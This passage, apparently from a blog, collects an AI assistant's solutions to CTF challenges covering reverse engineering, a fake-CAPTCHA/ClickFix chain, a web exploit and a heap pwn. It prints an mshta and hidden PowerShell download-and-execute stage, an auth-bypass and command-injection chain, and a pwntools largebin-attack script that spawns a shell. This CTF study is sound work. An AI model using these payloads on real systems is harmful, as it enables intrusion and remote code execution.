+<p>即：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forall i:</span><br><span class="line">    a1[i] == s[i]</span><br></pre></td></tr></table></figure>
+<p>也就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag == v7前38字节</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="3-真正的问题"><a href="#3-真正的问题" class="headerlink" title="3. 真正的问题"></a>3. 真正的问题</h1><p>你贴出来的代码 <strong>缺了关键全局数据</strong>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_40123A((<span class="type">char</span> *)&amp;unk_403080 + <span class="number">4</span> * i);</span><br></pre></td></tr></table></figure>
+<p>这里使用了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unk_403080</span><br></pre></td></tr></table></figure>
+<p>但你没有给 <code>.data/.rodata</code> 内容。</p>
+<p>而：</p>
+<ul>
+<li><code>sub_40161F</code></li>
+<li><code>sub_401761</code></li>
+</ul>
+<p>都会依赖它作为 TEA/XXTEA key。</p>
+<p>因此：</p>
+<h2 id="目前无法唯一恢复-flag"><a href="#目前无法唯一恢复-flag" class="headerlink" title="目前无法唯一恢复 flag"></a>目前无法唯一恢复 flag</h2><p>因为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最终 v7 的值依赖 unk_403080</span><br></pre></td></tr></table></figure>
+<p>没有这个全局 key，无法继续精确模拟。</p>
+<hr>
+<h1 id="你现在需要补充的内容"><a href="#你现在需要补充的内容" class="headerlink" title="你现在需要补充的内容"></a>你现在需要补充的内容</h1><p>请给：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unk_403080</span><br></pre></td></tr></table></figure>
+<p>附近的数据。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:403080 xx xx xx xx ...</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -s ./binary | grep 403080</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/16wx 0x403080</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="不过可以确认的一点"><a href="#不过可以确认的一点" class="headerlink" title="不过可以确认的一点"></a>不过可以确认的一点</h1><p>这个题：</p>
+<ul>
+<li>不是标准 XXTEA</li>
+<li>大量函数是垃圾混淆</li>
+<li>真正有效逻辑只有：</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">初始化40字节状态</span><br><span class="line">→ 做若干TEA变换</span><br><span class="line">→ 最终与输入直接比较</span><br></pre></td></tr></table></figure>
+<p>所以只要拿到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unk_403080</span><br></pre></td></tr></table></figure>
+<p>我就可以直接把 flag 算出来。</p>
+<p>(中间第二次调用的时候添加了数据)</p>
+<p>flag 已经可以还原出来。</p>
+<p>最终得到的 40 字节状态为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">53 70 69 72 69 74 7b 54 68 65 72 33 5f 69 73 5f</span><br><span class="line">34 5f 31 6f 74 5f 4f 66 5f 74 65 34 5f 74 6f 5f</span><br><span class="line">64 72 31 6e 6b 7d 00 00</span><br></pre></td></tr></table></figure>
+<p>转 ASCII：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spirit&#123;Ther3_is_4_1ot_Of_te4_to_dr1nk&#125;</span><br></pre></td></tr></table></figure>
+<p>因此：flag是</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spirit&#123;Ther3_is_4_1ot_Of_te4_to_dr1nk&#125;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>这个题的关键坑点：</p>
+<ul>
+<li><code>sub_401969()</code> 永远返回 0</li>
+<li><code>sub_401A4F()</code> / <code>sub_401B49()</code> 基本纯干扰</li>
+<li><p>真正修改状态的只有：</p>
+<ul>
+<li><code>sub_40161F</code>（TEA）</li>
+<li><code>sub_401761</code>（XXTEA-like）</li>
+</ul>
+</li>
+<li>最终 <code>sub_401D61()</code> 只是退化版 memcmp</li>
+</ul>
+<p>所以本质是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">初始40字节常量</span><br><span class="line">→ 按PRNG路径做TEA/XXTEA变换</span><br><span class="line">→ 得到最终40字节</span><br><span class="line">→ 与输入直接比较</span><br></pre></td></tr></table></figure>
+<p>而 <code>.rodata</code> 里的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this_is_a_key!!!</span><br></pre></td></tr></table></figure>
+<p>就是整个 TEA/XXTEA 的 key。</p>
+<h2 id="CythonChecker-reverse"><a href="#CythonChecker-reverse" class="headerlink" title="CythonChecker - reverse"></a>CythonChecker - reverse</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[loader.exe](challenge/loader.exe) 这是一个reverse ctf题,尝试还原flag</span><br><span class="line"></span><br><span class="line">(中间不知道为什么断了一段)</span><br><span class="line">继续执行,这个ctf题的文件目录就是chellenge/没有其他文件</span><br></pre></td></tr></table></figure>
+<p>已还原并验证成功。</p>
+<p><strong>Flag</strong><br><code>SpiritCTF&#123;Sh1fT_r0w3_aRe_NoT_wHa7_Y0u_eXp3cT&#125;</code></p>
+<p><strong>关键依据</strong></p>
+<ul>
+<li><code>challenge/loader.exe</code> 会在临时目录释放并加载 <code>runtime_codec.pyd</code></li>
+<li>loader 内部先从常量恢复出 16 字节 key：<br><code>1145141919810abc1145141919810cba</code></li>
+<li><code>runtime_codec.pyd</code> 里实际是一个 <strong>AES 变种</strong>：<ul>
+<li><code>shift_pattern = (0, 1, 3, 2)</code></li>
+<li><code>target_block_count = 3</code></li>
+<li><code>target_ciphertext = a5324678a39df1021d201826fef1b8e85c86030f5146aa2f8aad843758fd5c2d1984c40892cb5c3db4194f091e46f099</code></li>
+</ul>
+</li>
+<li>按该变种逆向解密后得到 payload：<br><code>Sh1fT_r0w3_aRe_NoT_wHa7_Y0u_eXp3cT</code></li>
+</ul>
+<p><strong>验证</strong><br>我已直接跑过：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c <span class="string">&quot;echo SpiritCTF&#123;Sh1fT_r0w3_aRe_NoT_wHa7_Y0u_eXp3cT&#125;| challenge\loader.exe&quot;</span></span><br></pre></td></tr></table></figure></p>
+<p>输出：<br><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: Correct</span><br></pre></td></tr></table></figure></p>
+<p>如果你要，我也可以把这题的<strong>完整逆向过程</strong>整理成 writeup。</p>
+<h2 id="I’m-a-human-reverse"><a href="#I’m-a-human-reverse" class="headerlink" title="I’m a human - reverse"></a>I’m a human - reverse</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Captcha Verification.html](Captcha Verification.html) 这是一个reverse ctf题,尝试还原flag,提示下载的mp3在这里 [audio_example.mp3](audio_example.mp3)</span><br></pre></td></tr></table></figure>
+<p>我先把这题还原到<strong>最后一个可见阶段</strong>了，但<strong>当前这份本地材料还不够 100% 还原最终 flag</strong>。</p>
+<h3 id="已还原出的攻击链"><a href="#已还原出的攻击链" class="headerlink" title="已还原出的攻击链"></a>已还原出的攻击链</h3><ol>
+<li><code>Captcha Verification.html</code> 是假验证码页。</li>
+<li>点击后会往剪贴板写入：<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta https://w5cvu754134s.challenge.jlu-terminal.site/audio_example.mp3</span><br></pre></td></tr></table></figure></li>
+<li><code>audio_example.mp3</code> 不是普通 mp3，而是 <strong>MP3 + HTA polyglot</strong>。<ul>
+<li>内含 <code>&lt;HTA:APPLICATION&gt;</code></li>
+<li>还藏了 <code>&lt;script&gt;...&lt;/script&gt;</code> 的 JScript</li>
+</ul>
+</li>
+<li>这段 JScript 解码后会调用：<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WScript.Shell</span><br></pre></td></tr></table></figure>
+然后执行隐藏 PowerShell。</li>
+<li><p>PowerShell 再解码出下一阶段，核心逻辑可整理成：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> <span class="string">&quot;<span class="variable">$env:SystemRoot</span>\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&quot;</span> `</span><br><span class="line">  <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> `</span><br><span class="line">  <span class="literal">-ArgumentList</span> <span class="string">&#x27;-w&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;-ep&#x27;</span>,<span class="string">&#x27;Unrestricted&#x27;</span>,<span class="string">&#x27;-Command&#x27;</span>,<span class="string">&quot;</span></span><br><span class="line"><span class="string">    <span class="variable">$u</span>=&#x27;https://w5cvu754134s.challenge.jlu-terminal.site/scene.jpg&#x27;</span></span><br><span class="line"><span class="string">    <span class="variable">$wc</span> = New-Object Net.WebClient</span></span><br><span class="line"><span class="string">    iex <span class="variable">$wc</span>.DownloadString(<span class="variable">$u</span>)</span></span><br><span class="line"><span class="string">  &quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="关键结论-1"><a href="#关键结论-1" class="headerlink" title="关键结论"></a>关键结论</h3><p>也就是说，<strong>最终 payload / flag 不在 html 和 mp3 里本体，而在第二阶段的 <code>scene.jpg</code></strong>。</p>
+<h3 id="现在卡住的原因"><a href="#现在卡住的原因" class="headerlink" title="现在卡住的原因"></a>现在卡住的原因</h3><p>我已经验证过当前地址：</p>
+<ul>
+<li><code>https://w5cvu754134s.challenge.jlu-terminal.site/</code></li>
+<li><code>.../audio_example.mp3</code></li>
+<li><code>.../scene.jpg</code></li>
+</ul>
+<p>现在都返回 <strong>404</strong>，所以这个二阶段已经取不到了。</p>
+<h3 id="所以目前能确认的是"><a href="#所以目前能确认的是" class="headerlink" title="所以目前能确认的是"></a>所以目前能确认的是</h3><p>这是一个典型的：</p>
+<p><strong>Fake CAPTCHA / ClickFix → mshta → polyglot mp3/hta → PowerShell → 下载并执行 scene.jpg</strong></p>
+<h3 id="我本地已经提取出的中间文件"><a href="#我本地已经提取出的中间文件" class="headerlink" title="我本地已经提取出的中间文件"></a>我本地已经提取出的中间文件</h3><ul>
+<li><code>stage1.js</code></li>
+<li><code>stage2.js</code></li>
+<li><code>stage4.txt</code></li>
+</ul>
+<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong>仅凭你现在给的 <code>html + audio_example.mp3</code>，我能还原到最终下载地址，但还原不了最终 flag 本体。</strong><br>如果你能再给我下面任意一个，我就能继续：</p>
+<ul>
+<li><code>scene.jpg</code></li>
+<li>该题目的附件包/流量包</li>
+<li>还能访问的在线环境</li>
+</ul>
+<p>如果你愿意，我下一条可以直接把<strong>完整解混淆过程</strong>和<strong>用于复现的 Python 解码脚本</strong>贴给你。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新的地址是 https://vt2cl0ejw1pe.challenge.jlu-terminal.site/ 还是这道题,请继续</span><br></pre></td></tr></table></figure>
+<p>继续追后，<strong>flag 已恢复</strong>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spirit&#123;6EWAr3-0F-ph1sHIng-w3BSiTE5115f3c07&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="关键证据"><a href="#关键证据" class="headerlink" title="关键证据"></a>关键证据</h3><p>我在 <strong>2026-05-17</strong> 对新地址 <code>https://vt2cl0ejw1pe.challenge.jlu-terminal.site/</code> 验证后发现：</p>
+<ul>
+<li><code>/</code> 可访问，仍是假验证码页面</li>
+<li><code>/audio_example.mp3</code> 仍是 <code>mshta</code> 用的 polyglot</li>
+<li><strong><code>/scene.jpg</code> 这次可访问</strong>，长度 <code>16674</code></li>
+</ul>
+<p>把 <code>scene.jpg</code> 解混淆后，最终得到 PowerShell 脚本，其中有这一段：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fF1IA49G</span> = <span class="string">&quot;Spirit&#123;6EWAr3-0F-ph1sHIng-w3BSiTE5115f3c07&#125;&quot;</span></span><br><span class="line"><span class="variable">$fF1IA49G</span> = <span class="string">&quot;N0pe&quot;</span></span><br></pre></td></tr></table></figure>
+<p>以及窗口文案：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Label2</span>.Text = <span class="string">&quot;这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里&quot;</span></span><br></pre></td></tr></table></figure>
+<p>意思很明显：<br>GUI 里没有 flag，但<strong>让 GUI 出现的脚本源码里有 flag</strong>。<br>后面立刻把变量改成 <code>N0pe</code> 只是障眼法。</p>
+<h3 id="还原链"><a href="#还原链" class="headerlink" title="还原链"></a>还原链</h3><ul>
+<li><code>Captcha Verification</code> 页面把剪贴板写成：<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta https://vt2cl0ejw1pe.challenge.jlu-terminal.site/audio_example.mp3</span><br></pre></td></tr></table></figure></li>
+<li><code>audio_example.mp3</code> 解出 PowerShell</li>
+<li>PowerShell 下载：<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vt2cl0ejw1pe.challenge.jlu-terminal.site/scene.jpg</span><br></pre></td></tr></table></figure></li>
+<li><code>scene.jpg</code> 实际是伪装成 jpg 的 PowerShell</li>
+<li>最终在脚本中藏了上面的 flag</li>
+</ul>
+<h3 id="本地关键文件"><a href="#本地关键文件" class="headerlink" title="本地关键文件"></a>本地关键文件</h3><ul>
+<li><code>new_captcha.html</code></li>
+<li><code>audio_new.mp3</code></li>
+<li><code>scene_new.jpg</code></li>
+<li><code>decoded_scene_final.ps1</code></li>
+</ul>
+<p>如果你要，我下一条可以把<strong>完整自动解混淆脚本</strong>整理给你。</p>
+<h2 id="Trust-Collapse-web"><a href="#Trust-Collapse-web" class="headerlink" title="Trust Collapse - web"></a>Trust Collapse - web</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trust-collapse 是一个ctf web挑战的目录,所有与该挑战相关的文件都在这个文件夹中,地址为 https://hpjl4oiik5jr.challenge.jlu-terminal.site ,尝试还原flag.</span><br></pre></td></tr></table></figure>
+<p>已还原，<code>flag</code> 是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpiritGame&#123;7ru57-CO1LAp53-In7O-5I6n3D_4CC35S21a9fd8c0&#125;</span><br></pre></td></tr></table></figure>
+<p>关键利用链：</p>
+<ul>
+<li>开发者账户硬编码：<code>developer / Sp1r1tG4m3_2026_D3v3l0p3r</code></li>
+<li>路由鉴权绕过：<code>/index.php/admin/...</code> 和 <code>/index.php/internal/...</code><ul>
+<li><code>web/public/index.php</code></li>
+<li><code>deriveGatewayPath()</code> 返回的是 <code>internal/...</code></li>
+<li>但鉴权判断用的是 <code>str_starts_with($pathInfo, &#39;/internal&#39;)</code></li>
+</ul>
+</li>
+<li>越权调用管理员接口，把项目切到 <code>workspace</code> + <code>legacy-sync(perforce)</code></li>
+<li>通过 <code>builder/server.py</code> 里的 <code>p4port = rsh:...</code> 触发命令执行</li>
+<li>再用越权访问的 <code>/index.php/admin/build/&lt;id&gt;/log</code> 读取完整构建日志，直接拿到环境变量里的 <code>FLAG</code></li>
+</ul>
+<p>我还进一步用泄露出的 <code>BUILD_SIGN_KEY</code> 请求了：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/internal/artifact/fetch</span><br></pre></td></tr></table></figure>
+<p>远端返回的也是同一个 flag，已验证成功。</p>
+<h2 id="Link-Start-reverse"><a href="#Link-Start-reverse" class="headerlink" title="Link Start! - reverse"></a>Link Start! - reverse</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link/ 是一个ctf挑战的目录,只有这两个文件,是一道reverse题目,尝试还原flag [client.exe](link/client.exe) [server.exe](link/server.exe)</span><br></pre></td></tr></table></figure>
+<p>还原出来了。</p>
+<ul>
+<li>第一阶段口令：<code>ssdddwddwddsssssasssdsdd</code></li>
+<li>最终 flag：<code>Spirit&#123;2DMaz3_w1th_SMC_4re_Interestin9_hahaha!&#125;</code></li>
+</ul>
+<p>简要结论：</p>
+<ul>
+<li><code>client.exe</code> 只是和 <code>server.exe</code> 交互，服务端返回首字节为 <code>c</code> 就进入下一步。</li>
+<li><code>server.exe</code> 第一段校验在运行时 <code>RVA 0x1500</code>，要求一个长度为 <code>0x18</code> 的 <code>wasd</code> 串，本质是走 10x10 迷宫。</li>
+<li>这串第一阶段口令会作为异或 key，解密 <code>RVA 0x11540</code> 的一段 <code>0x140</code> 字节代码。</li>
+<li>解密后的第二阶段是一个 RC4 风格校验器，拿用户第二次输入去和 <code>RVA 0x11680</code> 的 47 字节密文比对。</li>
+<li>逆出后明文就是上面的 flag。</li>
+</ul>
+<p>我已经实测通过原始程序：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello CTFer, Give me sth: ssdddwddwddsssssasssdsdd</span><br><span class="line">Give me your flag: Spirit&#123;2DMaz3_w1th_SMC_4re_Interestin9_hahaha!&#125;</span><br><span class="line">right!!!</span><br></pre></td></tr></table></figure>
+<p>如果你要，我也可以把这题的完整逆向过程和解密脚本整理给你。</p>
+<h2 id="Large-pwn"><a href="#Large-pwn" class="headerlink" title="Large - pwn"></a>Large - pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">large 是一个ctf pwn题的目录,所有相关的文件都在里面,现在先分析这个挑战,尝试脚本,我在等待靶机地址</span><br></pre></td></tr></table></figure>
+<p>先给结论：这题我已经跑通利用链了，脚本放在 <code>large/exp.py</code>。</p>
+<h3 id="题目结论"><a href="#题目结论" class="headerlink" title="题目结论"></a>题目结论</h3><ul>
+<li>保护：<code>Full RELRO / Canary / NX / PIE / SHSTK / IBT</code></li>
+<li>漏洞本质：<strong>UAF</strong><ul>
+<li><code>delete</code> 后不清空 <code>chunks[idx]</code></li>
+<li>所以还能 <code>show</code> / <code>edit</code> 已释放 chunk</li>
+</ul>
+</li>
+<li>尺寸限制：<code>0x501 ~ 0x5ff</code><ul>
+<li>这让 chunk 直接走 <strong>unsorted/largebin</strong>，基本就是在暗示 largebin attack</li>
+</ul>
+</li>
+</ul>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ol>
+<li><p><code>gift</code> 调用内置的 <code>printf(&quot;%p\n&quot;, &amp;g_f)</code><br>→ 直接泄露 <strong>PIE</strong>（准确说是 <code>g_f</code> 的地址）</p>
+</li>
+<li><p><code>show</code> 已释放的大块<br>→ 读出 unsorted bin 的 <code>fd/bk</code><br>→ 泄露 <strong>libc</strong>  </p>
+<ul>
+<li>我本地算出的偏移是：<code>main_arena+0x60 = libc + 0x203b20</code></li>
+</ul>
+</li>
+<li><p>先把 chunk1 放进 <strong>largebin</strong></p>
+</li>
+<li>用 UAF <code>edit chunk1</code> 改它的 <code>bk_nextsize = g_f - 0x20</code></li>
+<li><p>再把 chunk3 放进同一 largebin<br>→ 触发 <strong>largebin attack</strong><br>→ 把 <code>g_f</code> 改成 <code>chunk3</code> 的 chunk header</p>
+</li>
+<li><p>再 UAF 改 <code>chunk3</code> 内容，伪造成：</p>
+<ul>
+<li><code>system</code></li>
+<li><code>&quot;/bin/sh&quot;</code></li>
+<li><code>0</code></li>
+</ul>
+</li>
+<li>再次 <code>gift</code><br>→ 实际变成 <code>system(&quot;/bin/sh&quot;)</code></li>
+</ol>
+<h3 id="本地验证"><a href="#本地验证" class="headerlink" title="本地验证"></a>本地验证</h3><p>我已经用题目自带：</p>
+<ul>
+<li><code>large/pwn</code></li>
+<li><code>large/libc.so.6</code></li>
+<li><code>large/ld-linux-x86-64.so.2</code></li>
+</ul>
+<p>把这条链打通了，本地成功起到 shell。</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>文件：</p>
+<ul>
+<li><code>large/exp.py</code></li>
+</ul>
+<p>默认行为：</p>
+<ul>
+<li>连上后自动打 shell</li>
+<li>自动执行：<code>cat /flag; exit</code></li>
+</ul>
+<h3 id="你拿到靶机后直接跑"><a href="#你拿到靶机后直接跑" class="headerlink" title="你拿到靶机后直接跑"></a>你拿到靶机后直接跑</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python large/exp.py HOST=目标IP PORT=目标端口</span><br></pre></td></tr></table></figure>
+<p>如果你想手动交互，不自动 <code>cat /flag</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python large/exp.py HOST=目标IP PORT=目标端口 NOAUTO=1</span><br></pre></td></tr></table></figure></p>
+<p>如果你愿意，我下一步可以继续帮你：</p>
+<ul>
+<li>把 <code>exp.py</code> 再精简/加注释</li>
+<li>顺手写一个本地 Docker 启动命令</li>
+<li>你一发靶机地址，我直接帮你改成最终可打版本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BASE = Path(__file__).resolve().parent</span><br><span class="line">exe = ELF(<span class="built_in">str</span>(BASE / <span class="string">&quot;pwn&quot;</span>), checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="built_in">str</span>(BASE / <span class="string">&quot;libc.so.6&quot;</span>), checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = args.LOG_LEVEL <span class="keyword">or</span> <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">HOST = args.HOST <span class="keyword">or</span> <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">PORT = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">REQ_A = <span class="number">0x521</span>  <span class="comment"># chunk size -&gt; 0x530</span></span><br><span class="line">REQ_B = <span class="number">0x511</span>  <span class="comment"># chunk size -&gt; 0x520</span></span><br><span class="line">REQ_BIG = <span class="number">0x5FF</span></span><br><span class="line">UNSORTED_BK_OFF = <span class="number">0x203B20</span>  <span class="comment"># main_arena+0x60 with the provided libc-2.39</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">io, idx, size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">f&quot;add <span class="subst">&#123;idx&#125;</span> <span class="subst">&#123;size&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">io, idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">f&quot;delete <span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">io, idx, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">f&quot;edit <span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line">    io.send(data)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">io, idx, size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">f&quot;show <span class="subst">&#123;idx&#125;</span>&quot;</span>.encode())</span><br><span class="line">    data = io.recvn(size)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>(<span class="params">io</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;gift&quot;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(io.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">io</span>):</span><br><span class="line">    g_f = gift(io)</span><br><span class="line">    pie = g_f - exe.sym[<span class="string">&quot;g_f&quot;</span>]</span><br><span class="line">    log.success(<span class="string">f&quot;g_f leak = <span class="subst">&#123;g_f:#x&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;PIE base = 